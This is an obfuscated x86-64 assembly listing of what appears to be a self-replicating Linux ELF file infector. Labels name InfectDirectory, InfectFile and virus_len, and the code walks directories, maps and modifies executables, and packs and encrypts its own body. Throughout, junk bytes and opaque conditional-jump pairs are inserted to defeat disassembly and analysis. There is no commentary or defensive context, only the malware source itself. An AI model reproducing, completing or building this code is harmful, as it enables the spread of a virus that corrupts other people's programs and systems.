..@cYP3m13dZxlR:
    xor         rcx, rcx
    jmp         $+3
db 0x0f
    js          ..@FR0z9Y1smft7
    jns         ..@FR0z9Y1smft7
..@I27M6PAeuawS:
    push        rbx
    jb          ..@ZaVDMjyPWzVI
    jae         ..@ZaVDMjyPWzVI
..@QOcGNnZo6JhJ:
    xor         r2, r2
    je          ..@BtulF49EgnKO
    jne         ..@BtulF49EgnKO
..@JJNURWv7v9C8:
    syscall
    jmp         $+4
db 0x11, 0x80
    jmp         $+5
db 0xc5, 0xc6, 0x7f
    jmp         $+5
db 0x70, 0x50, 0xb4
    js          ..@lGjpmf11Ssv8
    jns         ..@lGjpmf11Ssv8
..@qr0jqEoWDR3n:
    jne         ..@ZcJZqhnAUXGj
    jmp         ..@nS9oytdHeOjV
..@Al0nTLhpBTyN:
    push        rdi
    jmp         $+4
db 0x19, 0x58
    jb          ..@CS2VW9Gt8vFe
    jae         ..@CS2VW9Gt8vFe
..@G7UcAslYyOL6:
    mov         rcx, rcx
    jmp         $+3
db 0x7d
    jmp         $+3
db 0xc5
    jmp         $+4
db 0xca, 0x9d
    js          ..@yadnR8KjLxCO
    jns         ..@yadnR8KjLxCO
..@eptMXIbomPL8:
%ifdef X86_64
    xchg        rdx, rdx
%endif
    jmp         $+3
db 0xc2
    jmp         $+4
db 0x8d, 0xa7
    jmp         $+3
db 0x53
    jmp         $+3
db 0xce
    je          ..@5os4CzlmuKwE
    jne         ..@5os4CzlmuKwE
..@kpJQkyishEpM:
    mov         QWORD [rdi], rsi
    jmp         ..@4DkVFCGeePIB
..@DZEXLvH6BGrJ:
    add         rdi, virus_len-_start
    jmp         $+4
db 0x0b, 0xc1
    js          ..@hpgRjibpfGrB
    jns         ..@hpgRjibpfGrB
..@rp1FQQZrdtB8:
    xor         rax, rax
    jmp         $+4
db 0xe8, 0x28
    jmp         $+4
db 0x2f, 0xac
    jb          ..@Ew4InucbLsaU
    jae         ..@Ew4InucbLsaU
..@DfIQ3OTkMSRL:
    mov         eax, SYS_SOCKET
    jmp         $+5
db 0x4b, 0x48, 0xf3
    jmp         ..@s1yQLLrf8aQm
..@Xyi6wWQvRnSa:
    mov         rdx, rdx
    je          ..@BPwz2Ni7fLeY
    jne         ..@BPwz2Ni7fLeY
..@YRkaWd9FTPXx:
    pop         rbx
    jmp         $+4
db 0x07, 0x2b
    jmp         ..@7Csb9M8O6HEW
..@Y1QvwAiRXzke:
    mov         rbp, rbp
    jmp         ..@b2UoTtgzu4sp
..@XClPKp2f4z4R:
    and         ax, 1111b
    js          ..@G4DjX88k80Xh
    jns         ..@G4DjX88k80Xh
Strcpy:
    jmp         ..@I5uNFvY9FNoH
..@FBPXcAXM1JwW:
    sub         rsp, _UPDATASIG_OFF_size
    js          ..@Sx8GoaNosU0Q
    jns         ..@Sx8GoaNosU0Q
FileValidation:
    jmp         ..@6Saofty61W1j
..@67wtIC4ihIxp:
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jmp         $+4
db 0x2e, 0x6e
    jmp         $+4
db 0xb7, 0xf0
    jb          ..@HPQOkbpwBncP
    jae         ..@HPQOkbpwBncP
..@EqqDoOzXWbUm:
    push        rdx
    jmp         $+3
db 0x18
    js          ..@VttLMgEd3WAH
    jns         ..@VttLMgEd3WAH
..@mGmOcIPJwZaC:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jmp         $+3
db 0x4a
    jmp         $+4
db 0xe6, 0x3f
    jmp         ..@ntc8ymaeyV9W
..@9qOm1wwgZJJ4:
    rep         nop
    jmp         $+5
db 0x5e, 0x60, 0xf2
    jmp         ..@sEPmasLq6z0x
..@kJW6IZutND33:
    je          ..@hgDoGSPPBir0
    jmp         ..@7QVGM7IqIjHw
..@dEYtHwpeJ9nL:
    push        0x00
    jb          ..@boH7jv70CfZS
    jae         ..@boH7jv70CfZS
..@GbxPBMeS8GWK:
    mov         QWORD [r5+file.fileptr], rax
    jmp         ..@L8ZeSgu7PrCd
..@qFYc0rQE8HEe:
    add         rax, 4
    jmp         ..@7bzSWZYdx4Wn
..@bFNSSv8Ox6yk:
    test        al, al
    jb          ..@8NI6WuVOYCMe
    jae         ..@8NI6WuVOYCMe
..@ke8NEolEvMps:
    mov         rsp, rsp
    jmp         $+4
db 0x0b, 0xe3
    js          ..@yeW0J8Bjhk6v
    jns         ..@yeW0J8Bjhk6v
..@MONwi6LLQccU:
    cmp         r2b, 0x0
    jl          ..@e85o6hTJYcuD
    jge         ..@e85o6hTJYcuD
..@nDa6Hwkpl882:
    mov         rsp, rsp
    jb          ..@1e6e3S9rnZpz
    jae         ..@1e6e3S9rnZpz
..@E91f00J6Wz5x:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+4
db 0x28, 0x00
    jmp         $+4
db 0x14, 0x28
    jmp         ..@vk0O6FK1KXyd
..@1xQdxbsKAHET:
    syscall
    jmp         ..@xfNKPN4jQ7KX
..@3DT7ReGiiwzt:
    movdqu      xmm1, oWORD [rsp+0x80]
    jmp         $+5
db 0x8d, 0x68, 0x49
    jmp         ..@f0wgNvWcCSBi
..@lJPoCDhQK5DR:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    jmp         $+3
db 0xd1
    jmp         $+3
db 0x03
    jb          ..@m5AJ5XTUWVPh
    jae         ..@m5AJ5XTUWVPh
..@kprLlaYDcE1B:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jb          ..@8W1mo6qTf4qP
    jae         ..@8W1mo6qTf4qP
..@bT1xPz9oENTq:
    mov         r5, [rsp]
    jmp         $+3
db 0xd5
    js          ..@XHrQJS3fgAh7
    jns         ..@XHrQJS3fgAh7
..@MakbhbS6rbRf:
%ifdef X86_32
    int         0x80
%endif
    jmp         $+5
db 0xd9, 0x4e, 0xd2
    jmp         $+4
db 0x2b, 0x2f
    jmp         ..@JvGt3zRvEejz
..@3dn3UcNVffLV:
    add         r1, _signature-_start
    jmp         $+5
db 0x4f, 0x61, 0x3a
    jmp         ..@WXWgJcc1bT2Y
..@wdLbtmQFMt5r:
    mov         rsi, rsi
    jmp         $+3
db 0xc0
    jmp         $+3
db 0x47
    jmp         ..@4zmZNkrCB2RH
..@cUVVjyyRbUEM:
    pop         rdi
    jl          ..@8TXTFject9ko
    jge         ..@8TXTFject9ko
..@ersxvQGQ5PgJ:
    xchg        rdx, rdx
    jmp         $+5
db 0x9f, 0xea, 0x6b
    jmp         $+5
db 0x3d, 0x7d, 0xba
    je          ..@LtXUxGlFh10Q
    jne         ..@LtXUxGlFh10Q
..@aXyb6CrOHRCh:
    mov         r4, r3
    je          ..@zxHM2fwQMleS
    jne         ..@zxHM2fwQMleS
..@V5X88xogpykD:
    xchg        rax, rax
    jmp         $+3
db 0x73
    jmp         $+3
db 0xc0
    jl          ..@VURe3Rs10wlX
    jge         ..@VURe3Rs10wlX
..@3S7Rl1LlvMWj:
%ifdef X86_32
    mov         rax, rax
%endif
    jmp         $+5
db 0xa1, 0xe1, 0xc2
    je          ..@ZBYE1bHwFXsk
    jne         ..@ZBYE1bHwFXsk
..@fugAOmmmslnM:
    pop         rdi
    jmp         $+5
db 0x6c, 0xdd, 0x4e
    jmp         ..@ZBiJZbLA3I6L
..@Qcml7iMPkRTd:
    cmp         rax, 0xffffffffffffffff
    jmp         ..@5DhsyPdhOVwO
..@XAfLJR6MzQds:
    xchg        rbx, rbx
    jmp         $+3
db 0x61
    jb          ..@YPzyNoFb0Jri
    jae         ..@YPzyNoFb0Jri
..@7Oaac8DqZOZf:
    mov         rcx, rcx
    jmp         $+4
db 0xa7, 0xb3
    jmp         ..@YTazhBda7FH1
..@jqvdzfck1EBI:
    mov         rsp, rsp
    jmp         $+3
db 0xaf
    js          ..@3kVbBCEbOYWo
    jns         ..@3kVbBCEbOYWo
..@8W1mo6qTf4qP:
    jl          ..@5G5lXuZMjCxD
    jmp         $+5
db 0x9e, 0xb9, 0x3c
    jmp         $+4
db 0x64, 0xa7
    jmp         $+3
db 0x83
    js          ..@fZ0raV5JIwc4
    jns         ..@fZ0raV5JIwc4
..@JXnDV4qW1G7y:
    pop         rcx
    jmp         ..@qzH0FVRA8mSX
..@HQbI4CK79NxK:
    add         eax, 0x30
    jmp         ..@yCvLrlyOmt7R
..@4MmuqMVVmXA4:
    CFILE       DWORD [rsp+_PROC_OFF.dirfd]
    js          ..@fjWAwPV0mHta
    jns         ..@fjWAwPV0mHta
..@47bV9HnyQvIi:
    mov         rdi, rdi
    jb          ..@0r93oJdviklF
    jae         ..@0r93oJdviklF
..@XnD4ButUQ95x:
    add         r1, non_packed_len+PADDING
    jl          ..@fDUKw5aGIOll
    jge         ..@fDUKw5aGIOll
..@o2tBdzt2NVkd:
    mov         rcx, rcx
    jmp         $+5
db 0xf4, 0x75, 0xb2
    js          ..@yQvseKVgtE0r
    jns         ..@yQvseKVgtE0r
..@6AAxzdzeF9Id:
    push        rsi
    jmp         $+4
db 0x2a, 0xb9
    jmp         $+5
db 0xad, 0x12, 0x36
    jmp         ..@X308ys4Ykbjs
..@dE6tUP7RVxCI:
    call        Strcpy
    jb          ..@NiAZofUI75Nz
    jae         ..@NiAZofUI75Nz
..@6PT9KHo9syZa:
    ret
    jmp         InfectDirectory
..@hU30H1gdJ9N7:
    push        rdi
    jmp         ..@biwdpY2qTEc2
..@tLrQztUBKXQK:
    mov         rax, [r5+file.filesize]
    jmp         $+3
db 0x7a
    jl          ..@fJ6NuRNXhI4E
    jge         ..@fJ6NuRNXhI4E
..@imcskUrbqBol:
    VAR         packed, status
    jl          ..@3YJIsAo9SypJ
    jge         ..@3YJIsAo9SypJ
..@4ol0WIqvyi6G:
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    jmp         $+5
db 0x50, 0x27, 0x93
    jmp         ..@60UU7vy1jGkz
..@fl80uowftETV:
    je          ..@6PT9KHo9syZa
    jmp         $+4
db 0xfe, 0x97
    je          ..@idYpkeEBLmDC
    jne         ..@idYpkeEBLmDC
..@SVOWUO5qojIt:
    mov         r2, QWORD [rsp+_KEYGEN_OFF.bufferaddr]
    jmp         ..@4xxvy8lTJrIA
..@5G5lXuZMjCxD:
    movdqu      xmm0, [rsi+rcx]
    jb          ..@nRDLF9YKNb4u
    jae         ..@nRDLF9YKNb4u
..@LNrYdzIrDAJz:
    xchg        rax, rax
    jmp         ..@6EHpFNVCbipC
..@h69jBOvcIRSR:
    rep movsb 
    jmp         $+4
db 0x76, 0x45
    js          ..@JQZ9kNnSTw9c
    jns         ..@JQZ9kNnSTw9c
..@dHyMQcVCk7SI:
    mov         QWORD [rsp+_DYNPIE_OFF.sh_ptr], r1
    jmp         $+5
db 0x0f, 0x39, 0xb6
    jb          ..@DmuofyFkohws
    jae         ..@DmuofyFkohws
..@1HTBJqpob05T:
    mov         QWORD [rsp+_INFDIR_OFF.dirindex], 0x00
    je          ..@sVXF3SvOVIpx
    jne         ..@sVXF3SvOVIpx
..@zvMZAQzMoeRk:
    push        rdx
    jmp         $+3
db 0x56
    jmp         $+3
db 0x93
    jmp         ..@Xyi6wWQvRnSa
..@ADxRDt9H3gdC:
    pop         r5
    js          ..@1yLuRXHaiEzw
    jns         ..@1yLuRXHaiEzw
..@rPAyGxsbUHQw:
    mov         rcx, rcx
    jmp         $+3
db 0x74
    js          ..@oYQDSiODW4YX
    jns         ..@oYQDSiODW4YX
..@S7I7IYqi9aRE:
    xchg        rcx, rcx
    jmp         ..@Jme3B7eHJK7H
..@aJVX3FpfFXdp:
    mov         rdi, rdi
    jmp         $+4
db 0x0c, 0x7f
    jb          ..@73crtGPQ0Bqu
    jae         ..@73crtGPQ0Bqu
..@sy8ULcB9fNVl:
    push        WORD 0x02
    je          ..@TeiFNOqcmRve
    jne         ..@TeiFNOqcmRve
..@xKuiNev9QAGM:
    pop         rcx
    jmp         $+4
db 0x1c, 0x1e
    je          ..@HGrhMmQZMKvc
    jne         ..@HGrhMmQZMKvc
..@a4hkKl0QIyhx:
    mov         r2, m6
    jmp         $+3
db 0xdd
    jmp         $+4
db 0x73, 0x7b
    jmp         ..@ZATRWTiwEkdU
..@d2nowUxE8BqZ:
    cmp         al, 0x0
    jmp         $+4
db 0xe7, 0x67
    jmp         ..@tfF6u0hVj6fs
..@6vcEwvbT7sMV:
    mov         r2, QWORD [rsp+_INFDIR_OFF.dirname]
    jmp         $+3
db 0xdb
    jmp         $+3
db 0x61
    jmp         $+5
db 0x60, 0x8a, 0xa3
    jb          ..@ALztnjyKjt9Q
    jae         ..@ALztnjyKjt9Q
..@dqL9guPU9wb1:
    cmp         r2d, '../'
    jb          ..@TDTTe8Sb3mKb
    jae         ..@TDTTe8Sb3mKb
..@kkKyzhDbmT0g:
%ifdef X86_64
    xor         r10, r10
%endif
    jmp         ..@EwNnAlUDZsFM
..@N5sDWfMMH32S:
    mov         r2, m7
    jmp         $+4
db 0x41, 0x8c
    js          ..@rMqsVPS9ZWF9
    jns         ..@rMqsVPS9ZWF9
..@Jme3B7eHJK7H:
    mov         r5, [rsp]
    jmp         ..@hlx5ErTeyklG
..@C95izOy4MoWD:
    mov         r1, rax
    jmp         ..@IXS4QOynWUyR
..@C2x8zdhz0I1X:
    VAR         packed, execve2
    jmp         $+5
db 0xb7, 0x14, 0xad
    jmp         ..@9cWkyNcqgq3h
..@bM5LrGP8GjaS:
    pop         rdi
    jmp         $+3
db 0x13
    jmp         ..@av6e4TGjAmu7
..@1ou0czQi7h0y:
    call        AddSizeMappedFile
    jmp         ..@e1IagOzOPG1c
..@8NI6WuVOYCMe:
    xchg        rax, rax
    js          ..@CiNsd8mCL9do
    jns         ..@CiNsd8mCL9do
..@PBoCxaccHJLR:
    ret
    jb          ..@aaeFoCx1YIPA
    jae         ..@aaeFoCx1YIPA
..@7WJR4jjh3q4v:
    push        rdi
    je          ..@FRQwkU8cuthg
    jne         ..@FRQwkU8cuthg
..@aaeFoCx1YIPA:
    xchg        rcx, rcx
    jl          InfectFile
    jge         InfectFile
..@vbrRX8UWscDp:
    mov         r3, r1
    jl          ..@HJ1N08XY6e2a
    jge         ..@HJ1N08XY6e2a
..@DHUmQHXJJwk9:
    cmp         r1, 0x00
    js          ..@AzvuTCUK97i4
    jns         ..@AzvuTCUK97i4
..@ZQGBlfPjQctA:
    mov         dx, WORD [rsp+_LZSSE_OFF.la_index]
    jmp         $+4
db 0x70, 0xe6
    jmp         ..@ed6cwcNQZR5X
..@7F3dXYe4qm5T:
    xor         rcx, rcx
    jmp         ..@2ZR0B8AAfA6W
..@N2BW9RcO0MNZ:
    mov         rsp, rsp
    js          ..@eYUrg9FWeouT
    jns         ..@eYUrg9FWeouT
..@BJBRF87HNXgt:
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    jmp         $+5
db 0xad, 0xfc, 0xf3
    jmp         ..@eChFGO7hQms6
..@HxtPrY2G2CbG:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    jmp         $+3
db 0xa8
    je          ..@wakv2WUc0CkC
    jne         ..@wakv2WUc0CkC
..@emyLD7i8QGyE:
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         ..@JzqiPuKFit0T
..@7y8cbXb5Nazr:
    mov         WORD [rsp+_LZSSE_OFF.match_pos], bx
    jmp         $+5
db 0xb3, 0xca, 0x29
    jl          ..@STHAYEqI97Ns
    jge         ..@STHAYEqI97Ns
..@drTbFmfDLJym:
    xchg        rbx, rbx
    jb          ..@RIUmEg8pdeRt
    jae         ..@RIUmEg8pdeRt
..@KoOALeAJirev:
    mov         rdi, rdi
    jmp         $+5
db 0x62, 0xb9, 0xaa
    je          ..@HVkqq6DsEioi
    jne         ..@HVkqq6DsEioi
..@wIKdGEuOiqNf:
    xor         rcx, rcx
    jl          ..@uNWPjhxMHwkg
    jge         ..@uNWPjhxMHwkg
..@2ei9p2z8YbmZ:
    cmp         rax, 0x0
    jl          ..@0bvBnVyQ36mX
    jge         ..@0bvBnVyQ36mX
..@ZBiJZbLA3I6L:
    push        rcx
    jb          ..@UIEqdjmIdTT2
    jae         ..@UIEqdjmIdTT2
..@xEMhOYlsiSCT:
    xchg        rsp, rsp
    js          ..@ZmyFxGTgojWR
    jns         ..@ZmyFxGTgojWR
..@t3gtBZqDd2Vk:
    mov         rsi, QWORD [rsp+_LZSSE_OFF.inputaddr]
    jmp         ..@1PKYVZQffaNU
..@NGZq4TTxWGWi:
    xchg        rdx, rdx
    jmp         $+5
db 0x6f, 0x03, 0x05
    jmp         $+5
db 0x57, 0x30, 0xfd
    jb          ..@8bsf1jwV76H0
    jae         ..@8bsf1jwV76H0
..@tfF6u0hVj6fs:
    jl          ..@UwQqBwbJXmp6
    jb          ..@SGkPpwBSwyEs
    jae         ..@SGkPpwBSwyEs
..@O9aNFDtZjNoJ:
    push        rdx
    je          ..@LFsJfpKCwAJz
    jne         ..@LFsJfpKCwAJz
..@YRyIAl18Pruf:
    mov         rbx, rbx
    jl          ..@tSVXZUqWzldd
    jge         ..@tSVXZUqWzldd
..@7fyHzQDyhno0:
    pop         rbx
    jmp         $+3
db 0xba
    jmp         ..@QpVt0F0tZntw
..@B1Ewv6FSxtqe:
    cmp         WORD [r1], '..'
    js          ..@YRzi8wTLfYj5
    jns         ..@YRzi8wTLfYj5
..@sbLMNm7RGG5p:
    call        AddSizeMappedFile
    jmp         $+4
db 0x4c, 0x6c
    jb          ..@MNaEjV3sm5ff
    jae         ..@MNaEjV3sm5ff
..@gaGUSGY6yZ4h:
    syscall
    jmp         ..@rpX7k3MiL27y
..@tjHaiU2jkTu3:
    pop         rcx
    js          ..@HissivJZQpmT
    jns         ..@HissivJZQpmT
..@XHA2fHU00egB:
    pop         rbx
    jmp         $+5
db 0x7a, 0xa4, 0x06
    jmp         $+3
db 0x1a
    jmp         $+5
db 0x23, 0xec, 0xca
    jmp         ..@0Z0wsrZrl8jm
..@rH4dcEHBK4vr:
    mov         r1, QWORD [rsp+_DYNPIE_OFF.ptr]
    jmp         $+3
db 0x16
    jmp         $+4
db 0x37, 0x8c
    jmp         ..@9tuvYh3XNOeL
..@pF4uTM3ZxXSO:
    xor         rax, rax
    js          ..@iot56Ngvcin5
    jns         ..@iot56Ngvcin5
..@eSb6KUDOsbO1:
    push        rbx
    jmp         $+3
db 0xda
    je          ..@AmR0YJIo5ixz
    jne         ..@AmR0YJIo5ixz
..@0lFAl2mw0JYl:
    mov         rsi, rdi
    jmp         $+3
db 0x9f
    jmp         ..@Vz5f0gEeRxBq
..@WcpjgTw1XFiU:
    VAR         packed, dirs_tmp
    jmp         $+3
db 0xb9
    jl          ..@r84WpT3kWnJZ
    jge         ..@r84WpT3kWnJZ
..@eJNhj314uWWr:
    movdqu      xmm1, oWORD [rsp+0xe0]
    jmp         $+5
db 0x8b, 0x24, 0x5f
    jmp         $+4
db 0xd7, 0xd4
    jmp         ..@lG6SF5rYYDw1
..@abPvIXlT5EIB:
    push        rcx
    jmp         $+4
db 0xff, 0x3f
    jmp         $+5
db 0x80, 0x61, 0xb0
    jmp         ..@5dUvQxmJCXDs
..@JvGt3zRvEejz:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+5
db 0x36, 0xaf, 0xb1
    jmp         $+4
db 0x04, 0x15
    jb          ..@x4IQQVek5OMk
    jae         ..@x4IQQVek5OMk
..@raayyu4e5MHJ:
    push        r5
    jl          ..@WjhBl4kXl5dU
    jge         ..@WjhBl4kXl5dU
..@mpVoyKAchUfg:
    test        r2, r2
    js          ..@Muv8TxOn888g
    jns         ..@Muv8TxOn888g
..@PVyfnJ6LrkYg:
    xchg        rcx, rcx
    jmp         $+3
db 0xd5
    jmp         $+5
db 0x2f, 0xdb, 0xc6
    js          ..@vVfRn3bt4IFQ
    jns         ..@vVfRn3bt4IFQ
..@FQlHGbHnALT3:
    mov         DWORD [rsp+_INFDIR_OFF.dirfd], eax
    js          ..@5Ii8U7ttfpiJ
    jns         ..@5Ii8U7ttfpiJ
..@vguW7zVfYFKZ:
    xchg        rbx, rbx
    js          ..@8r9qZ6Svt9l1
    jns         ..@8r9qZ6Svt9l1
..@9XxRQQnx5qbu:
    mov         r1, r5
    jmp         $+4
db 0x42, 0xdb
    jmp         $+4
db 0x5a, 0xe9
    jmp         $+5
db 0x5d, 0xf9, 0x20
    jb          ..@WQkrUrY1emfp
    jae         ..@WQkrUrY1emfp
..@g9jl1G9S8e1A:
    lea         r1, [rsp+_NBF_OFF.key]
    je          ..@V1l1CpjqiRo7
    jne         ..@V1l1CpjqiRo7
..@eOaIIwRfSb6g:
    mov         r2, [rsp+_PROC_OFF.dirname]
    js          ..@vjBlFCHNAyu1
    jns         ..@vjBlFCHNAyu1
..@opG6Nc17svAw:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jl          ..@dR0mzIBZS4ZQ
    jge         ..@dR0mzIBZS4ZQ
..@cGGF9LgRRfC6:
    xchg        rdx, rdx
    jmp         $+4
db 0x6f, 0x28
    jmp         ..@6kERAh8FNQLY
..@FVirR3ALDxvN:
    add         rdi, _signature.key_preview-_signature.start
    jmp         $+5
db 0xb3, 0x23, 0x65
    jl          ..@Yetcpjdk92mw
    jge         ..@Yetcpjdk92mw
..@HqWlQCC2uepC:
    pop         rax
    je          ..@W6tZMtPWUgC8
    jne         ..@W6tZMtPWUgC8
..@qi3Bz6l39lzy:
    mov         rbx, rbx
    jmp         $+3
db 0x5c
    jmp         $+5
db 0x36, 0xfc, 0xca
    jb          ..@TzYLTYaWq1c5
    jae         ..@TzYLTYaWq1c5
..@FWWwHPMmhfxl:
    rep         movsb
    jmp         $+5
db 0x43, 0xdf, 0xf6
    jb          ..@90gszdfhIyyf
    jae         ..@90gszdfhIyyf
..@QfbRnMErX3iq:
    and         rsp, 0xfffffffffffffff0
    jmp         ..@tYX9HrmLCJSy
..@DaXJ8rE90jG6:
    push        r3
    js          ..@0BCVPe4afGNf
    jns         ..@0BCVPe4afGNf
..@5DRh27zFJYQq:
    cmp         rdi, rsi
    js          ..@2yR7diAqbNwi
    jns         ..@2yR7diAqbNwi
..@8Zx8XzpL8H3d:
    ret
    jmp         $+3
db 0x3b
    jb          Memset
    jae         Memset
..@QDG2S62TUpVA:
    mov         rsi, rsi
    jmp         $+4
db 0x85, 0x45
    jmp         $+3
db 0x24
    js          ..@7szc3aFRnWUE
    jns         ..@7szc3aFRnWUE
..@5Ii8U7ttfpiJ:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         $+3
db 0x0d
    jmp         $+5
db 0xc1, 0x38, 0xbd
    jmp         ..@EA1NVTQZl7fE
..@UC5cPkFjUcBE:
    pop         rsi
    jmp         $+3
db 0x6b
    jmp         $+3
db 0x41
    jmp         $+4
db 0x7f, 0xce
    js          ..@VIfXL8MJYPKg
    jns         ..@VIfXL8MJYPKg
DYNPIEValidation:
    jmp         ..@JDkyyeYty3XL
..@coCMycr5WKvm:
    xor         rax, rax
    jb          ..@Zblf2tZchjwe
    jae         ..@Zblf2tZchjwe
..@Fx1OEH1D6TyO:
    rep         stosb
    jmp         $+4
db 0xea, 0xbc
    jmp         $+3
db 0x87
    jmp         ..@HKqTcKE7Y8IT
..@SOPER4uleJvr:
    mov         rcx, rcx
    je          ..@L8wyhOw1uLbh
    jne         ..@L8wyhOw1uLbh
..@DpRiNWjtN5WU:
    push        rdx
    jb          ..@UnWXN5KKV4Ok
    jae         ..@UnWXN5KKV4Ok
..@upk1k5mT2spM:
    mov         rbp, rbp
    jmp         $+4
db 0x9b, 0x76
    jl          ..@15JssrC1Co8y
    jge         ..@15JssrC1Co8y
..@pM4SQx2C0DkX:
%ifdef X86_64
    push        rax
%endif
    jmp         $+4
db 0xd1, 0x0b
    js          ..@NwHRVmfnl7ca
    jns         ..@NwHRVmfnl7ca
..@7t64mwgINd1U:
    cmp         WORD [r1], './'
    jb          ..@ZUpD1YIMjeeI
    jae         ..@ZUpD1YIMjeeI
..@BrCGekch61TK:
    cmp         bx, WORD [rsi+e_h.e_shnum]
    jmp         $+4
db 0x58, 0xb6
    js          ..@4aLjmWZPCKSx
    jns         ..@4aLjmWZPCKSx
..@K27XwW5bkpM3:
    call_vsp    Strlen
    jmp         $+3
db 0x4c
    je          ..@1PwytZvp3sog
    jne         ..@1PwytZvp3sog
..@nJAD0BBWroHv:
    ret
    jl          UnmapFile
    jge         UnmapFile
..@Cp6AylOBhbG7:
    lea         r3, [rsp+_NBF_OFF.key]
    jmp         ..@saitJF0GWoRk
..@f04O4axf8Kgv:
    push        rdx
    jl          ..@JiWtfHIsgJro
    jge         ..@JiWtfHIsgJro
..@Uu1GPgY2XTxt:
    mov         DWORD [rsp+_UPDATASIG_OFF.keyprev], r3d
    jb          ..@clyWkjQvgnBu
    jae         ..@clyWkjQvgnBu
..@6BqqJqqjIlMd:
    sub         rsp, _AESE_OFF_size+0x100
    jl          ..@4LX7oSSj6fjB
    jge         ..@4LX7oSSj6fjB
..@UVklK2vdedpj:
    syscall
    js          ..@urEgEGwyJ3V5
    jns         ..@urEgEGwyJ3V5
..@7bzSWZYdx4Wn:
    push        rax
    jmp         $+4
db 0x77, 0xc4
    jmp         $+5
db 0x28, 0x69, 0xde
    jmp         $+3
db 0xd9
    jmp         ..@WHp6I2h8IFjG
..@ZAXOB8LBRRdm:
    push        rax
    jl          ..@cyGNxsTCd25W
    jge         ..@cyGNxsTCd25W
..@VRXWOo1zRHh0:
    pop         rax
    jmp         $+4
db 0xb8, 0x5e
    jmp         $+5
db 0x97, 0xb4, 0x24
    js          ..@kMf7hRKR42kQ
    jns         ..@kMf7hRKR42kQ
..@pqIOl8YaSwus:
    ret
    jmp         IsNum
..@v4ahKHeqdml5:
    mov         rsi, rsi
    jmp         ..@uAauQVc93ul4
..@K456sgk4nljn:
%ifdef X86_64
    pop         rdx
%endif
    jb          ..@l1tF0xCwhBIl
    jae         ..@l1tF0xCwhBIl
..@KFJP2KEkxK79:
    xchg        rcx, rcx
    jb          ..@6sO2CDsApM89
    jae         ..@6sO2CDsApM89
..@4Hi3cSYQ35dR:
    pop         rdx
    jmp         $+4
db 0xe0, 0x67
    jb          ..@qEpmy4yE5jWX
    jae         ..@qEpmy4yE5jWX
..@UYPrwO5h0bEI:
    mov         rbx, rbx
    jb          ..@H7coQXlbN5QZ
    jae         ..@H7coQXlbN5QZ
..@FKzBiIv0umXN:
    xor         r4, r4
    jmp         $+5
db 0x2a, 0xc9, 0x39
    jmp         $+4
db 0xc3, 0x12
    jmp         $+5
db 0xbf, 0x66, 0x90
    js          ..@68n1dD5QfkEr
    jns         ..@68n1dD5QfkEr
..@rFABBf1o2dPp:
    mov         rdi, rdi
    jmp         $+5
db 0x5c, 0x63, 0x5b
    jb          ..@ld1Uy6LnLWwU
    jae         ..@ld1Uy6LnLWwU
..@EAyFm2INl1HA:
    rep         nop
    jl          ..@fkGsWPgW0ZU2
    jge         ..@fkGsWPgW0ZU2
..@rMqsVPS9ZWF9:
    sub         r2, m6
    jmp         ..@m0x7QwpmzfxT
..@Z0vrjClZuITO:
    pop         rsi
    jl          ..@6vcEwvbT7sMV
    jge         ..@6vcEwvbT7sMV
..@a5GsuDcFj2WF:
    jmp         ..@r84WpT3kWnJZ
    jb          ..@wcJ7VPXRC6dF
    jae         ..@wcJ7VPXRC6dF
..@LYWFcxQY0Sz1:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+4
db 0x14, 0x4c
    jmp         $+5
db 0x2d, 0xa8, 0xab
    jmp         ..@X7s94pRyXfsx
..@2q7Ze9GnnQ5h:
    CFILE       DWORD [r5+file.filefd]
    jb          ..@3ewpnq0acImD
    jae         ..@3ewpnq0acImD
..@yuPyXGLhXWq0:
    ODIR        [rsp+_PROC_OFF.dirfd], [rsp+_PROC_OFF.dirbuf], DIRENT_BUFSIZE
    jmp         ..@0KIGmWKlQhjv
..@Z6nmX5x5ofn9:
    mov         ax, WORD [r1]
    jmp         $+3
db 0x7b
    jmp         $+3
db 0x96
    jmp         $+4
db 0xc8, 0x64
    jmp         ..@zhL7ykK8IjGg
..@saClQoy6AUwq:
    mov         rdi, QWORD [rsp+_AESE_OFF.keyaddr]
    jmp         ..@QmGDGVaBkp8a
..@78Hw9XZfSzJJ:
    pop         r5
    jmp         $+3
db 0xdd
    jmp         $+3
db 0x09
    jb          ..@xwr7QTCP4Rzw
    jae         ..@xwr7QTCP4Rzw
..@pNPTFSmxvxEF:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jmp         $+5
db 0x2d, 0xf2, 0x7d
    jmp         ..@vLasp30cQQ4e
..@Ekq7htLhMLuq:
    mov         rax, rax
    js          ..@n2FBnpQ0qGYE
    jns         ..@n2FBnpQ0qGYE
..@KkNXNxxyEF8k:
    test        eax, eax
    jmp         $+4
db 0x57, 0x23
    jmp         $+3
db 0x22
    jmp         ..@GDuSowwJl36h
..@epIxiRhy7aWp:
    mov         rdx, rdx
    jmp         ..@P52pnmOMQQpf
..@1FrAd4VgjCwb:
    shl         ebx, LENGTH_BITS
    jmp         ..@pSVKfTnqT2qW
..@4sZKhFNV1GaC:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jb          ..@4hNCUfOutU64
    jae         ..@4hNCUfOutU64
..@qE26EBI8qEHS:
    xchg        rax, rax
    js          ..@s7XqDYeO35hu
    jns         ..@s7XqDYeO35hu
..@4dLT6eA7KG0o:
    xchg        rcx, rcx
    jb          ..@wlDbLk7BtiHL
    jae         ..@wlDbLk7BtiHL
..@fim4nhtes239:
    mov         rsi, QWORD [rsp+_DYNPIE_OFF.ptr]
    js          ..@BrCGekch61TK
    jns         ..@BrCGekch61TK
